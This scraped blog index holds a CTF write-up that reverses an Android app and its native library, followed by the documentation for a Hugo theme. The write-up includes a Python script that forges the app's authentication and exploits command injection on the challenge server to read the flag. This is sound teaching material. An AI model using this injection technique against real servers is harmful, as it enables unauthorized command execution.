<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now();
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener("scroll", throttle(scrollCallback, 200));
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    
    const codeBlocks = document.querySelectorAll(
      'code[class^="language-"]:not(.output):not([class*="language-console"])',
    );

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

        "title": "The Andro Experiment",
        "tags": ["Android","CTF","Reverse Engineering",],
        "content": "The Andro Experiment Hello! I made this Android RE CTF challenge you can find here on my github.\nI highly suggest hosting the challenge and solving it yourself first, and/or following along with this.\nSo let\u0026rsquo;s walk through the solution and thought process!\nWhat\u0026rsquo;s the deal? Hey, it\u0026#39;s Chase again. I did some more research into some of the experiments Anthony was doing and found this website. Something about an android application calling back to a server, so once again see if there is any information on the server about him? https://the-andro-experiment.ctf.ritsec.club/ To start you are told that you have an android app that is calling back to a server. You are then greeted with this website\u0026hellip;\nhttp://the-andro-experiment.ctf.ritsec.club From either of the download links you can download Andro.apk. There is also, the ping link on the navbar that doesn\u0026rsquo;t actually increment the App Ping Number.\nThis number not incrementing by the website is a hint towards something the app is doing that allows that number to increment.\nWhat you\u0026rsquo;re supposed to do Running The App Right off the bat I would throw this in an emulator or push it onto an actual device if you have one.\nI\u0026rsquo;m using the Android Studio Emulator on a Pixel_3a_API_34_extension_level_7_x86_64\nThis challenge can be done with static reversing, but detonating someone random\u0026rsquo;s \u0026ldquo;CTF Challenge\u0026rdquo; is always a good idea to gain more information.\nWhen you first run the app you are greeted with this\u0026hellip;\nThe first thought is a free flag in base64 but when you decode it you get\n‚ÄúThere is no real ending. It‚Äôs just the place where you stop the story.‚Äù ‚Äï Frank Herbert\n\u0026hellip;this is just a Dune quote\nWhat\u0026rsquo;s important is the Server Authenticated toast that popped up, and the Ping Server button visible.\nWhen the Ping Server button is clicked you get this back\u0026hellip;\nThe ping worked!\nYou may receive an error message when running this or starting the app, if so, the server is most likely down.\nThis is all the real functionality of the app, but this will give context to the functionality of the app we see later.\nReversing The App Opening Andro.apk in Jadx shows us a lot\u0026hellip;\nThese in the MainActivity are important:\nseed - seed value variable used in server authentication\ngenerateSeed() function to generate the seed value\nperformGetRequest() function for sending a GET request to the server\nrollCode() function for reauthing with the server every request\nsendBytesToServer() function for sending data to the server\nHeads up these function names arent entirely indicative of what the function actually does, so let\u0026rsquo;s see what they do below.\nIn the main activity, we see\u0026hellip;\npublic class MainActivity extends AppCompatActivity { static byte[] seed = new byte[0]; ExecutorService executor = Executors.newFixedThreadPool(10); public native byte[] generateSeed(); public native byte[] rollCode(byte[] bArr); /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(C0570R.layout.activity_main); System.loadLibrary(\u0026#34;andro\u0026#34;); // \u0026lt; System.loadLibrary(\u0026#34;ssl\u0026#34;); // \u0026lt;-- These 3 lines System.loadLibrary(\u0026#34;crypto\u0026#34;); // \u0026lt; seed = generateSeed(); performGetRequest(); Button myButton = (Button) findViewById(C0570R.C0573id.button); myButton.setOnClickListener(new View.OnClickListener() { // from class: com.example.andro.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View v) { Log.d(\u0026#34;rollcode\u0026#34;, \u0026#34;OnClick\u0026#34; + Arrays.toString(MainActivity.seed)); MainActivity.seed = MainActivity.this.rollCode(MainActivity.seed); MainActivity.this.sendBytesToServer(MainActivity.seed); } }); } You can see on the lines starting with System.loadLibrary.\nThere are some native libraries being imported, these contain the native functions referenced later.\nOtherwise, on start, we generate our seed with generateSeed() and then run performGetRequest().\nThen we simply wait for the button to be clicked. If clicked, the seed value is logged, then we run the rollcode() function using that original seed. Then that seed is sent to the server with sendBytesToServer().\nperformGetRequest() private void performGetRequest() { byte[] result = new byte[\u0026#34;SEED:\u0026#34;.length() + 4]; for (int i = 0; i \u0026lt; \u0026#34;SEED:\u0026#34;.length(); i++) { result[i] = \u0026#34;SEED:\u0026#34;.getBytes()[i]; } for (int i2 = 0; i2 \u0026lt; seed.length; i2++) { result[\u0026#34;SEED:\u0026#34;.length() + i2] = seed[i2]; } sendBytesToServer(result); } This function sends the seed, with the prefix of SEED: to the sendBytesToServer() function.\nAll the loops just convert the strings to bytes, otherwise, let\u0026rsquo;s see what happens to the result after it\u0026rsquo;s sent.\nsendBytesToServer() public void sendBytesToServer(final byte[] code) { this.executor.execute(new Runnable() { // from class: com.example.andro.MainActivity.2 @Override // java.lang.Runnable public void run() { MediaType RAW = MediaType.get(\u0026#34;application/octet-stream\u0026#34;); OkHttpClient client = new OkHttpClient(); RequestBody body = RequestBody.create(code, RAW); Request request = new Request.Builder().url(\u0026#34;http://the-andro-experiment.ctf.ritsec.club/ping\u0026#34;).post(body).build(); try { Response response = client.newCall(request).execute(); MainActivity.this.runOnUiThread(new Runnable() { // from class: com.example.andro.MainActivity.2.1 @Override // java.lang.Runnable public void run() { if (code[0] != 83) { Toast.makeText(MainActivity.this, \u0026#34;Ping Sent\u0026#34;, 0).show(); } else { Toast.makeText(MainActivity.this, \u0026#34;Server Authenticated\u0026#34;, 0).show(); } } }); if (response != null) { response.close(); } } catch (IOException e) { Log.d(\u0026#34;MainErr\u0026#34;, e.toString()); MainActivity.this.runOnUiThread(new Runnable() { // from class: com.example.andro.MainActivity.2.2 @Override // java.lang.Runnable public void run() { Toast.makeText(MainActivity.this, \u0026#34;Could Not Send\u0026#34;, 0).show(); } }); } } }); } Going top down, we can see that the functions deals with some threading with Runnables.\nThis prepares the OkHTTPClient for the request we\u0026rsquo;re sending. In the body we send the code(seed) that was generated before in the body. The request is sent to the website from before, but at /ping.\nhttp://the-andro-experiment.ctf.ritsec.club/ping If you remember from before pinging the server on the website didn\u0026rsquo;t work, but pinging it from the app did. This is because of OkHTTP we\u0026rsquo;ll see that later too.\nWe then try running it. If successful we make the toast with Ping Sent. Unless the first bytes of code is 83 (which is the letter S). Then, we toast Server Authenticated.\nIf this was the seed from performGetRequest it means we authenticated. It is simply checking if we prefixes the seed with SEED:.\nBoth we saw before when we ran the app.\nOtherwise, we catch any errors and clean up.\nReversing the Library If you remember the app imported some libraries and got the functions generateSeed() and rollCode() within the Java part of the app. Let\u0026rsquo;s dig into those.\nFirst, we have to open up the apk which contains other files inside (similar to a .zip) using apktool .\nRunning this on the apk will give us access to the libraries inside.\n$ apktool d Andro.apk -f\nNow we have these\u0026hellip;\n$ ls Andro/lib/x86_64 libandro.so libcrypto.so libssl.so The libraries libcrypto and libssl aren\u0026rsquo;t important for us here. The one with the challenge\u0026rsquo;s namesake libandro is it.\nOpening up libandro in Binary Ninja we can see the functions on the left side, clicking on the ones we saw in jadx may return this\u0026hellip;\nA lot of terrible JNI functions, these aren\u0026rsquo;t important for the function implementation they\u0026rsquo;re just for using them within the Java.\nThe actual implementation is usually right next to it.\nUsing Pseudo C the generateSeed() function looks like this\u0026hellip;\nAs you can see when we generate the seed, we\u0026rsquo;re actually just taking 4 bytes from /dev/urandom.\nInside of the rollCode() function, we see this\u0026hellip;\nIt is a simple SHA256 hash every times using that crypto library.\nReferencing the Java code earlier\u0026hellip;\npublic void onClick(View v) { Log.d(\u0026#34;rollcode\u0026#34;, \u0026#34;OnClick\u0026#34; + Arrays.toString(MainActivity.seed)); MainActivity.seed = MainActivity.this.rollCode(MainActivity.seed); MainActivity.this.sendBytesToServer(MainActivity.seed); } It seems like there is a rolling code system that rolls the previous code/seed with the server every time it sends the next ping.\nFinally, if you looked further in the library you would\u0026rsquo;ve seen this piece of deprecated code\u0026hellip;\nThis tells us about this unimplemented command_server() function, which uses /experiment.\nFrom this URL we can see it takes a command. Lastly, the server seems to expect okhttp which is the reason why the app is able to ping the server and not the website.\nOkhttp specifies the User-Agent on is packets as Okhttp3. But the server isn\u0026rsquo;t that strict with checking it.\nThe Finale Now we have everything we need to do to beat the challenge.\nThe methodology is that we need to send a packet, exploiting the command injection in /experiment. This packet must contain the Okttp User-Agent. Lastly, the payload need to contain a rolled(SHA256 hash) version of a seed or previous code on the server.\nMy original solution was using Frida to log the seed value from the app when ran. Then crafting a packet using that in Python. But there is a simpler way of spoofing the app with your own seed.\nThat version is below\u0026hellip;\n#!/usr/bin/env python3 import requests import hashlib def main(): headers = {\u0026#39;User-Agent\u0026#39;: \u0026#39;okhttp\u0026#39;} seed = b\u0026#39;SEED:\\x01\\x01\\x02\\x03\u0026#39; URL0 = \u0026#39;http://the-andro-experiment.ctf.ritsec.club/ping\u0026#39; response = requests.post(url=URL0, data=seed, headers=headers) command = input(\u0026#34;Enter command: \u0026#34;) URL1=\u0026#39;http://the-andro-experiment.ctf.ritsec.club/experiment?command=\u0026#39; + command payload = hashlib.sha256(b\u0026#39;\\x01\\x01\\x02\\x03\u0026#39;).digest() response = requests.post(url=URL1, data=payload, headers=headers) print(response.text) if __name__ == \u0026#34;__main__\u0026#34;: main() As you can see, we send the seed at first to /ping using requests with the okhttp User-Agent. This allows the user to then send the command given through user input to URL1. We hash the seed ourselves and replace the data of the request with that. Then we get our result.\n$ ./simple_pwn.py Enter command: ls entrypoint.sh flag.txt main.py requirements.txt static templates $ ./simple_pwn.py Enter command: cat flag.txt RS{th3_myst3ry_k33ps_unf0ld1ng} Flag: RS{th3_myst3ry_k33ps_unf0ld1ng}\n", 
        "url": "http:\/\/localhost:1313\/post\/the_andro_experiment\/"
    },

        "content": "Simple hugo theme to be dead easy on the reader.\nInstallation Initialize go module\nhugo mod init \u0026lt;module_path\u0026gt; Add theme to your config.yml\nmodule: imports: - path: github.com/barklan/hugo-dead-simple Fetch theme\nhugo mod get -u Configuration Site parameters This site\u0026rsquo;s config can be found here .\nSection parameters 1--- 2title: \u0026#34;Section title\u0026#34; 3weight: 1 4nodate: false # display date next to post title 5--- Page parameters 1--- 2title: \u0026#34;Post/Page title\u0026#34; 3subtitle: \u0026#34;...example subtitle\u0026#34; 4date: \u0026#34;2023-08-11\u0026#34; 5toc: true # table of contents (only h2 and h3 added to toc) 6bold: true # display post title in bold in posts list 7categories: 8 - ... 9tags: 10 - ... 11next: true # show link to next post in footer 12nomenu: true # hide site menu 13notitle: true # hide title 14--- Deployment Generate and add favicons to /static\nDeploy your site to Netlify with this netlify.toml\n1[build] 2publish = \u0026#34;public\u0026#34; 3command = \u0026#34;hugo --gc --minify\u0026#34; 4 5[context.production] 6environment = { HUGO_VERSION = \u0026#34;0.144.0\u0026#34; } Post features Hugo shortcodes\nIn all examples you‚Äôll need to adjust code so the % or \u0026lt; are touching the { like this: {%.\nFootnotes Here\u0026#39;s a sentence with a footnote.[^1] [^1]: This is unnamed footnote. Here\u0026rsquo;s a sentence with a footnote.1\nMark \u0026lt;mark\u0026gt;Marked text\u0026lt;/mark\u0026gt; Marked text\nBoxes {{\u0026lt; box info \u0026gt;}} **This is a bold line** Hello there, and have a nice day {{\u0026lt; /box \u0026gt;}} info, tip, warning, important\nThis is a bold line\nHello there, and have a nice day\nHello there, and have a nice day\nHello there, and have a nice day\nHello there, and have a nice day\nCollapsible \u0026lt;details\u0026gt; \u0026lt;summary\u0026gt;Collapsible\u0026lt;/summary\u0026gt; ![rose](./pinkrose.avif) \u0026lt;/details\u0026gt; Collapsible some code Tables Use table generator .\nCode Code blocks support usual Hugo highlighting features. Additionally \u0026ldquo;copy\u0026rdquo; button is added to each code block automatically.\n```go {linenos=inline,hl_lines=[2, \u0026#34;6-9\u0026#34;],linenostart=19} // ... code ``` Produces:\n19func randPass(n uint8, extraChars string) (string, error) { 20\tconst base = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-\u0026#34; 21\tletters := base + extraChars 22\tret := make([]byte, n) 23\tvar i uint8 24\tfor i = 0; i \u0026lt; n; i++ { 25\tnum, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) 26\tif err != nil { 27\treturn \u0026#34;\u0026#34;, err 28\t} 29\tret[i] = letters[num.Int64()] 30\t} 31 32\treturn string(ret), nil 33} Smaller code ```go {.fs90} num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) ``` Produces:\nnum, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) Available classes: fs95, fs90, fs85, fs80, fs75, fs70 and fs50.\nKaTeX Inline \\(\\pi = 3.14\\) œÄ=3.14\\pi = 3.14œÄ=3.14\nBlock $$ \\begin{align} \\sqrt{37} \u0026amp; = \\sqrt{\\frac{73^2-1}{12^2}} \\\\ \u0026amp; = \\sqrt{\\frac{73^2}{12^2}\\cdot\\frac{73^2-1}{73^2}} \\\\ \u0026amp; = \\frac{73}{12}\\sqrt{1 - \\frac{1}{73^2}} \\\\ \u0026amp; \\approx \\frac{73}{12}\\left(1 - \\frac{1}{2\\cdot73^2}\\right) \\end{align} $$ 37=732‚àí1122=732122‚ãÖ732‚àí1732=73121‚àí1732‚âà7312(1‚àí12‚ãÖ732) \\begin{align} \\sqrt{37} \u0026amp; = \\sqrt{\\frac{73^2-1}{12^2}} \\\\ \u0026amp; = \\sqrt{\\frac{73^2}{12^2}\\cdot\\frac{73^2-1}{73^2}} \\\\ \u0026amp; = \\frac{73}{12}\\sqrt{1 - \\frac{1}{73^2}} \\\\ \u0026amp; \\approx \\frac{73}{12}\\left(1 - \\frac{1}{2\\cdot73^2}\\right) \\end{align} 37‚Äã‚Äã=122732‚àí1‚Äã‚Äã=122732‚Äã‚ãÖ732732‚àí1‚Äã‚Äã=1273‚Äã1‚àí7321‚Äã‚Äã‚âà1273‚Äã(1‚àí2‚ãÖ7321‚Äã)‚Äã‚ÄãNote that if you don\u0026rsquo;t want automatic numbering you can use \\begin{align*}.\nChemistry \\[ \\tag*{(2)} \\ce{Zn^2+ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{amphoteric hydroxide}}{\\ce{Zn(OH)2 v}}$ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{tetrahydroxozincate}}{\\ce{[Zn(OH)4]^2-}}$} \\] ZnX2+‚áå+2‚ÄâHX++2‚ÄâOHX‚àíZn(OH)X2‚Üìamphoteric¬†hydroxide‚áå+2‚ÄâHX++2‚ÄâOHX‚àí[Zn(OH)X4]X2‚àítetrahydroxozincate \\ce{Zn^2+ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{amphoteric hydroxide}}{\\ce{Zn(OH)2 v}}$ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{tetrahydroxozincate}}{\\ce{[Zn(OH)4]^2-}}$} ZnX2++2OHX‚àí+2HX+‚Äãamphoteric¬†hydroxideZn(OH)X2‚Äã‚Üì‚Äã+2OHX‚àí+2HX+‚Äãtetrahydroxozincate[Zn(OH)X4‚Äã]X2‚àí‚ÄãUse supported functions and support table for reference.\nFile trees Use tree.nathanfriend.io to make beautiful file tree structures like this one:\n. ‚îú‚îÄ‚îÄ tmp/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îî‚îÄ‚îÄ temp.py ‚îú‚îÄ‚îÄ src/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îî‚îÄ‚îÄ main.py ‚îî‚îÄ‚îÄ Dockerfile Images General All images are lazy-loaded. You can use the usual ![image](./image.png) to insert images.\nInternally it uses imgp class. You can customize images like this:\n\u0026lt;p class=\u0026#34;imgp\u0026#34;\u0026gt; \u0026lt;img style=\u0026#34;max-height: 50vh; border: 6px solid var(--complimentary);\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; Figure element {{\u0026lt; figure src=\u0026#34;./pinkrose.avif\u0026#34; title=\u0026#34;An elephant at sunset\u0026#34; \u0026gt;}} As with images, you can customize figure:\n\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; style=\u0026#34;max-height: 50vh;\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; Pink rose Plots To make the charts look good use this context manager:\nimport matplotlib.pyplot as plt import matplotlib as mpl import numpy as np import seaborn as sns class Blog: def __init__(self, filename, figsize=(6, 6), axis=True): self.filename = filename self.figsize = figsize self.axis = axis def set_plot(self, figsize=(6, 6)): sns.set() sns.set_theme(style=\u0026#34;white\u0026#34;, palette=\u0026#34;bright\u0026#34;) COLOR = \u0026#34;grey\u0026#34; mpl.rcParams[\u0026#34;text.color\u0026#34;] = COLOR mpl.rcParams[\u0026#34;axes.labelcolor\u0026#34;] = COLOR mpl.rcParams[\u0026#34;xtick.color\u0026#34;] = COLOR mpl.rcParams[\u0026#34;ytick.color\u0026#34;] = COLOR plt.figure(figsize=self.figsize) sns.set_context(\u0026#34;paper\u0026#34;) def save_plot(self): if self.axis: plt.axis(\u0026#34;on\u0026#34;) else: plt.axis(\u0026#34;off\u0026#34;) plt.savefig(self.filename, format=\u0026#34;svg\u0026#34;, bbox_inches=\u0026#34;tight\u0026#34;, pad_inches=0.3, transparent=True) def __enter__(self): self.set_plot() return self def __exit__(self, exc_type, exc_value, exc_traceback): self.save_plot() Then you can use it like this\nx = np.arange(0, 10, 0.00001) y = x * np.sin(2 * np.pi * x) fmri = sns.load_dataset(\u0026#34;fmri\u0026#34;) with Blog(\u0026#34;fmri.svg\u0026#34;, figsize=(7, 7), axis=True): sns.lineplot(x=\u0026#34;timepoint\u0026#34;, y=\u0026#34;signal\u0026#34;, hue=\u0026#34;region\u0026#34;, style=\u0026#34;event\u0026#34;, data=fmri) Looks good in light and dark mode!\nImage galleries You can create image galleries with this:\n\u0026lt;ul class=\u0026#34;image-gallery\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; src=\u0026#34;./flower.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; Pink rose Not a rose If you want three images in a row additionally add three-image-gallery class to ul.\nTwo images {{\u0026lt; twoimg \u0026#34;./pinkrose.avif\u0026#34; \u0026#34;./flower.avif\u0026#34; \u0026gt;}} Three images {{\u0026lt; threeimg \u0026#34;./pinkrose.avif\u0026#34; \u0026#34;./flower.avif\u0026#34; \u0026#34;./pinkrose.avif\u0026#34; \u0026gt;}} YouTube {{\u0026lt; youtube x6Ssz1WiKN8 \u0026gt;}} Attachments {{\u0026lt; attachments folder=\u0026#34;temp\u0026#34; title=\u0026#34;Boom\u0026#34; caption=\u0026#34;example\u0026#34; \u0026gt;}} title and caption can be omitted.\nBoom (example) temp.py üîó \u0026nbsp; (783b) Columns {{ % columns %}} #### Title 1 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026#39;s standard dummy text ever since the 1500s. \u0026lt;---\u0026gt; #### Title 2 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026#39;s standard dummy text ever since the 1500s {{ % /columns %}} Title 1 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026rsquo;s standard dummy text ever since the 1500s.\nTitle 2 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026rsquo;s standard dummy text ever since the 1500s\nColumns with other elements An elephant at sunset An elephant at sunset Tabs {{\u0026lt; tabs \u0026gt;}} {{\u0026lt; tab \u0026#34;MacOS\u0026#34; \u0026gt;}} This is tab **MacOS** content. Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} This is tab **Linux** content. {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} This is tab **Windows** content. Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! {{\u0026lt; /tab \u0026gt;}}
